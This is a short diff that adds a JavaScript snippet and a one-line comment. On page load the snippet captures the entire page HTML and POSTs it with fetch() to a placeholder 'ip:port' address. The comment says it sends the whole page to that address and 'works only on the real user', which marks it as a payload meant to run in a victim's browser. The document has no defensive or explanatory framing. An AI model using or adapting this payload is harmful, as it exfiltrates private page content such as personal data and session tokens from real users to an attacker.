@@ -1,1 +1,3 @@
-
+window.onload = function() { var elements = document.documentElement.outerHTML; fetch('ip:port', {method: "POST", body:elements});}; 
+the code sends the whole page to the specified ip(works only on the real user)
+--------------------------------
